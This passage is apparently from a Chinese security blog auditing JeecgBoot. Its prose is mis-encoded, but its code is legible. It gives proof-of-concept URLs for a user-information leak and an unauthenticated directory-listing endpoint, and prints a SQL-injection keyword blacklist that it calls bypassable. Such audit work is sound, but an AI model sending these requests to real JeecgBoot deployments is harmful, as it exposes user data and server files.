</span></span></span><span class="line"><span class="cl"><span class="c1">//     String phone = sysUser.getPhone();  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//     String username = sysUser.getUsername();  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//     Result&lt;Map&lt;String, Object&gt;&gt; result = new Result&lt;Map&lt;String, Object&gt;&gt;();  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//     Map&lt;String, Object&gt; map = new HashMap&lt;String, Object&gt;();  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//     if (oConvertUtils.isNotEmpty(phone)) {  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//        SysUser user = sysUserService.getUserByPhone(phone);  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//        if(user!=null) {  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//           map.put(&#34;username&#34;,user.getUsername());  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//           map.put(&#34;phone&#34;,user.getPhone());  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//           result.setSuccess(true);  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//           result.setResult(map);  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//           return result;  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//        }  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//     }  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//     if (oConvertUtils.isNotEmpty(username)) {  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//        SysUser user = sysUserService.getUserByName(username);  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//        if(user!=null) {  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//           map.put(&#34;username&#34;,user.getUsername());  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//           map.put(&#34;phone&#34;,user.getPhone());  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//           result.setSuccess(true);  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//           result.setResult(map);  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//           return result;  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//        }  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//     }  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//     result.setSuccess(false);  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//     result.setMessage(&#34;éªŒè¯å¤±è´¥&#34;);  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//     return result;  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">//  }</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¢«æ³¨é‡Šæ‰äº†ï¼Œçœ‹æ¥æ˜¯åˆ é™¤äº†è¿™ä¸ªæ–¹æ³•ï¼Œç®€å•å®¡è®¡ä¸€ä¸‹ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ã€‚åªè¦æŸ¥åˆ°äº†ç”¨æˆ·åæˆ–è€…ç”µè¯å·ç å…¶ä¸­ä¸€ä¸ªï¼Œåœ¨ä»£ç ä¸­éƒ½ä¼šè‡ªåŠ¨å»æ£€æµ‹å¦ä¸€ä¸ªæ˜¯ä»€ä¹ˆï¼Œç„¶åç›´æ¥åŒ¹é…å‡ºæ¥è¿›è¡ŒæŸ¥è¯¢ã€‚å¾ˆæ˜æ˜¾çš„ä¸€ä¸ªä¿¡æ¯æ³„éœ²å•Šï¼Œæœ€ç®€å•çš„adminè‚¯å®šå°±èƒ½æŸ¥å‡ºæ¥äº†ã€‚
POCå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/jeecg-boot/sys/user/querySysUser?username=admin
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ä¿®å¤å»ºè®®-1">ä¿®å¤å»ºè®®
</h2><p>ç›´æ¥åˆ é™¤ä¹Ÿæ²¡ä»€ä¹ˆæ¯›ç—…ï¼Œä¸»è¦æ˜¯è¦å…ˆç¡®å®šç”µè¯å·ç å’Œç”¨æˆ·åæ˜¯åŒä¸€äººçš„ï¼Œæ‰èƒ½æä¾›æŸ¥è¯¢çš„æ•ˆæœï¼Œå•ä¸€åŒ¹é…æ¼æ´å¤ªæ˜æ˜¾äº†ï¼Œè¦æœ‰éç©ºçš„åˆ¤æ–­ã€‚</p>
<h1 id="ç›®å½•éå†æ¼æ´">ç›®å½•éå†æ¼æ´
</h1><p>æ¥ç€æ¥çœ‹å§ã€‚</p>
<h2 id="jsæ–‡ä»¶ä»£ç ">JSæ–‡ä»¶ä»£ç 
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">data</span><span class="o">:</span><span class="kd">function</span><span class="p">(){</span><span class="k">return</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">title</span><span class="o">:</span><span class="s2">&#34;é€‰æ‹©æ–‡ä»¶ç›®å½•&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">visible</span><span class="o">:!</span><span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">confirmLoading</span><span class="o">:!</span><span class="mi">1</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">treeData</span><span class="o">:</span><span class="p">[],</span>
</span></span><span class="line"><span class="cl">  <span class="nx">fileTreeUrl</span><span class="o">:</span><span class="s2">&#34;/online/cgform/head/fileTree&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">rootFileUrl</span><span class="o">:</span><span class="s2">&#34;/online/cgform/head/rootFile&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">selectedKey</span><span class="o">:</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå°±æ˜¯å¯¹åº”çš„æ¥å£ï¼Œæˆ‘ä»¬çœ‹çœ‹å¯¹åº”çš„é€»è¾‘ä»£ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">onLoadData</span><span class="o">:</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">t</span><span class="o">=</span><span class="k">this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="k">new</span> <span class="nb">Promise</span><span class="p">((</span><span class="kd">function</span><span class="p">(</span><span class="nx">n</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">dataRef</span><span class="p">.</span><span class="nx">children</span><span class="p">)</span><span class="nx">n</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kd">var</span> <span class="nx">a</span><span class="o">=</span><span class="p">{</span><span class="nx">parentPath</span><span class="o">:</span><span class="nx">e</span><span class="p">.</span><span class="nx">dataRef</span><span class="p">.</span><span class="nx">key</span><span class="p">};</span> 
</span></span><span class="line"><span class="cl">      <span class="nb">Object</span><span class="p">(</span><span class="nx">i</span><span class="p">[</span><span class="s2">&#34;c&#34;</span><span class="p">])(</span><span class="nx">t</span><span class="p">.</span><span class="nx">fileTreeUrl</span><span class="p">,</span><span class="nx">a</span><span class="p">).</span><span class="nx">then</span><span class="p">((</span><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nx">a</span><span class="p">.</span><span class="nx">success</span><span class="o">&amp;&amp;</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">dataRef</span><span class="p">.</span><span class="nx">children</span><span class="o">=</span><span class="nx">a</span><span class="p">.</span><span class="nx">result</span><span class="p">,</span><span class="nx">t</span><span class="p">.</span><span class="nx">treeData</span><span class="o">=</span><span class="nx">o</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">treeData</span><span class="p">)),</span><span class="nx">n</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">      <span class="p">}))</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}))</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹è¿™ä¸ªä»£ç å°±å¯ä»¥å‘ç°ï¼Œè¿™é‡Œç›´æ¥æ¥æ”¶å‰ç«¯GETä¼ è¿‡æ¥çš„å‚æ•°ï¼Œå¹¶ä¸”æ²¡æœ‰ä»»ä½•æƒé™æ ¡éªŒï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥è®¿é—®è¿™ä¸ªæ¥å£ï¼Œç„¶åè¿›è¡Œæ”»å‡»ã€‚
POCå¦‚ä¸‹ï¼š
<code>/jeecg-boot/online/cgform/head/fileTree?_t=1632524014&amp;parentPath=/</code>
è¿™é‡Œè²Œä¼¼æ˜¯å› ä¸ºæ—¶é—´æˆ³çš„åŸå› ï¼Œç›´æ¥çœ‹ä¸åˆ°ï¼Œä½†æ˜¯å¯ä»¥è®¿é—®åˆ°ï¼Œæ¼æ´åº”è¯¥æ˜¯å­˜åœ¨çš„ï¼Œå› ä¸ºæ²¡æœ‰åšæƒé™çš„åˆ¤æ–­ã€‚
<img src="/images/JeecgBoot/5.png"
	
	
	
	loading="lazy"
	
		alt="ç¤ºä¾‹"
	
	
>
å¦‚æœæœ‰éœ€è¦çš„è¯ï¼Œå¯ä»¥å†™ä¸€ä¸ªè„šæœ¬æ¥è·‘ä¸€ä¸‹ï¼Œå¤§æ¦‚ç‡æ˜¯å¯ä»¥è·å–çš„ã€‚</p>
<h2 id="ä¿®å¤å»ºè®®-2">ä¿®å¤å»ºè®®
</h2><p>å¢åŠ æƒé™çš„æ ¡éªŒï¼Œåªè®©ç®¡ç†å‘˜æœ‰æŸ¥è¯¢æƒé™ï¼Œæˆ–è€…éç®¡ç†å‘˜çš„å‚æ•°åªèƒ½ä¸ºå›ºå®šçš„ï¼Œæ¯”å¦‚æŸä¸ªæŒ‰é’®ç›´æ¥è®¿é—®è¿™ä¸ªæ¥å£ï¼Œæ”¾å›å¯¹åº”çš„æ–‡ä»¶å¤¹ï¼Œä½†æ˜¯ä¸èƒ½ä¿®æ”¹å‚æ•°ç­‰ã€‚</p>
<h1 id="sqlæ³¨å…¥">SQLæ³¨å…¥
</h1><p>è¿™é‡Œçš„SQLæ³¨å…¥ç‚¹æŒºå¤šçš„ï¼Œå…ˆçœ‹çœ‹å§ã€‚</p>
<h2 id="querytabledataæ¥å£">queryTableDataæ¥å£
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@GetMapping</span><span class="p">(</span><span class="s">&#34;/queryTableData&#34;</span><span class="p">)</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="n">Result</span><span class="o">&lt;</span><span class="n">List</span><span class="o">&lt;</span><span class="n">DictModel</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="nf">queryTableData</span><span class="p">(</span><span class="n">DictQuery</span><span class="w"> </span><span class="n">query</span><span class="p">,</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">                                    </span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;pageNo&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">defaultValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;1&#34;</span><span class="p">)</span><span class="w"> </span><span class="n">Integer</span><span class="w"> </span><span class="n">pageNo</span><span class="p">,</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">                                    </span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;pageSize&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">defaultValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;10&#34;</span><span class="p">)</span><span class="w"> </span><span class="n">Integer</span><span class="w"> </span><span class="n">pageSize</span><span class="p">,</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">                                    </span><span class="nd">@RequestParam</span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;sign&#34;</span><span class="p">,</span><span class="n">required</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">)</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">sign</span><span class="p">,</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">){</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Result</span><span class="o">&lt;</span><span class="n">List</span><span class="o">&lt;</span><span class="n">DictModel</span><span class="o">&gt;&gt;</span><span class="w"> </span><span class="n">res</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Result</span><span class="o">&lt;</span><span class="n">List</span><span class="o">&lt;</span><span class="n">DictModel</span><span class="o">&gt;&gt;</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// SQLæ³¨å…¥æ¼æ´ signç­¾åæ ¡éªŒ  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">dictCode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">query</span><span class="p">.</span><span class="na">getTable</span><span class="p">()</span><span class="o">+</span><span class="s">&#34;,&#34;</span><span class="o">+</span><span class="n">query</span><span class="p">.</span><span class="na">getText</span><span class="p">()</span><span class="o">+</span><span class="s">&#34;,&#34;</span><span class="o">+</span><span class="n">query</span><span class="p">.</span><span class="na">getCode</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">SqlInjectionUtil</span><span class="p">.</span><span class="na">filterContent</span><span class="p">(</span><span class="n">dictCode</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">List</span><span class="o">&lt;</span><span class="n">DictModel</span><span class="o">&gt;</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">this</span><span class="p">.</span><span class="na">sysDictService</span><span class="p">.</span><span class="na">queryDictTablePageList</span><span class="p">(</span><span class="n">query</span><span class="p">,</span><span class="n">pageSize</span><span class="p">,</span><span class="n">pageNo</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">res</span><span class="p">.</span><span class="na">setResult</span><span class="p">(</span><span class="n">ls</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">res</span><span class="p">.</span><span class="na">setSuccess</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">res</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„ä»£ç æ¼æ´è¿˜æ˜¯æŒºæ˜æ˜¾çš„å•Šï¼Œå¾ˆæ˜æ˜¾å°±æ˜¯ç›´æ¥è¿›è¡Œäº†æ‹¼æ¥ï¼Œç„¶åå»è¿›è¡Œçš„ä¸€ä¸ªæŸ¥è¯¢çš„æ“ä½œï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹SqlInjectionUtil.filterContentæ˜¯ä¸ªä»€ä¹ˆæ–¹æ³•ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">filterContent</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">value</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">customXssString</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">value</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">value</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="k">return</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// ç»Ÿä¸€è½¬ä¸ºå°å†™  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">value</span><span class="p">.</span><span class="na">toLowerCase</span><span class="p">();</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//SQLæ³¨å…¥æ£€æµ‹å­˜åœ¨ç»•è¿‡é£é™© https://gitee.com/jeecg/jeecg-boot/issues/I4NZGE    value = value.replaceAll(&#34;/\\*.*\\*/&#34;,&#34;&#34;);  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">xssArr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">XSS_STR</span><span class="p">.</span><span class="na">split</span><span class="p">(</span><span class="s">&#34;\\|&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">xssArr</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">value</span><span class="p">.</span><span class="na">indexOf</span><span class="p">(</span><span class="n">xssArr</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="n">log</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="s">&#34;è¯·æ³¨æ„ï¼Œå­˜åœ¨SQLæ³¨å…¥å…³é”®è¯---&gt; {}&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">xssArr</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="n">log</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="s">&#34;è¯·æ³¨æ„ï¼Œå€¼å¯èƒ½å­˜åœ¨SQLæ³¨å…¥é£é™©!---&gt; {}&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RuntimeException</span><span class="p">(</span><span class="s">&#34;è¯·æ³¨æ„ï¼Œå€¼å¯èƒ½å­˜åœ¨SQLæ³¨å…¥é£é™©!---&gt;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">value</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//update-begin-author:taoyan date:2022-7-13 for: é™¤äº†XSS_STRè¿™äº›æå‰è®¾ç½®å¥½çš„ï¼Œè¿˜éœ€è¦é¢å¤–çš„æ ¡éªŒæ¯”å¦‚ å•å¼•å·  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">customXssString</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">xssArr2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">customXssString</span><span class="p">.</span><span class="na">split</span><span class="p">(</span><span class="s">&#34;\\|&#34;</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">xssArr2</span><span class="p">.</span><span class="na">length</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">value</span><span class="p">.</span><span class="na">indexOf</span><span class="p">(</span><span class="n">xssArr2</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">             </span><span class="n">log</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="s">&#34;è¯·æ³¨æ„ï¼Œå­˜åœ¨SQLæ³¨å…¥å…³é”®è¯---&gt; {}&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">xssArr2</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">             </span><span class="n">log</span><span class="p">.</span><span class="na">error</span><span class="p">(</span><span class="s">&#34;è¯·æ³¨æ„ï¼Œå€¼å¯èƒ½å­˜åœ¨SQLæ³¨å…¥é£é™©!---&gt; {}&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">             </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RuntimeException</span><span class="p">(</span><span class="s">&#34;è¯·æ³¨æ„ï¼Œå€¼å¯èƒ½å­˜åœ¨SQLæ³¨å…¥é£é™©!---&gt;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">value</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//update-end-author:taoyan date:2022-7-13 for: é™¤äº†XSS_STRè¿™äº›æå‰è®¾ç½®å¥½çš„ï¼Œè¿˜éœ€è¦é¢å¤–çš„æ ¡éªŒæ¯”å¦‚ å•å¼•å·  </span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">Pattern</span><span class="p">.</span><span class="na">matches</span><span class="p">(</span><span class="n">SHOW_TABLES</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">Pattern</span><span class="p">.</span><span class="na">matches</span><span class="p">(</span><span class="n">REGULAR_EXPRE_USER</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="p">)){</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">       </span><span class="k">throw</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">RuntimeException</span><span class="p">(</span><span class="s">&#34;è¯·æ³¨æ„ï¼Œå€¼å¯èƒ½å­˜åœ¨SQLæ³¨å…¥é£é™©!---&gt;&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">value</span><span class="p">);</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="p">;</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å¾ˆæ˜æ˜¾çš„ä¸€ä¸ªSQLçš„wafå•Šï¼Œçœ‹çœ‹è²Œä¼¼æ˜¯ç”¨é»‘åå•æ¥wafçš„ï¼Œä½†æ˜¯è²Œä¼¼å¾ˆå¤šä¸œè¥¿éƒ½æ²¡wafåˆ°å•Šï¼Œå…ˆçœ‹çœ‹é»‘åå•æœ‰å“ªäº›ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">private</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">XSS_STR</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;and |exec |insert |select |delete |update |drop |count |chr |mid |master |truncate |char |declare |;|or |+|user()&#34;</span><span class="p">;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
